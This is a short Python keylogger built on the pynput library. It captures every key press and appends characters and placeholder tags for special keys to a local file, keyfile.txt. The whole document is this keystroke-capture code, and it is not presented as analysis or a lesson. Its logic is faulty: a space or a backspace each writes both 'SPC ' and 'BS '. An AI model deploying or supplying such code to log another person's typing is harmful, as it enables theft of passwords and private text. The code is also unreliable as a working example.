from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt",'a') as logkey:
        try:
            # Attempt to get the character representation of the key
            char = getattr(key, 'char', None)
            if char:
                logkey.write(char)
            else:
                # Handle special keys
                if key.name in ['space', 'backspace']:
                    logkey.write('SPC ')  # Spacebar
                    logkey.write('BS ')   # Backspace
                elif key.name.startswith('num'):  # Numeric keys
                    logkey.write('NUM ')  # Prefixing with 'NUM '
                elif key.name.startswith('kp'):  # Numpad keys
                    logkey.write('KP ')  # Prefixing with 'KP '
                elif key.name.startswith('fn_'):  # Function (Fn) keys
                    logkey.write('FN ')  # Prefixing with 'FN '
                else:
                    logkey.write('SPE')  # Generic symbol for other special keys
        except Exception as e:
            print(f"There's an error: {str(e)}")
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
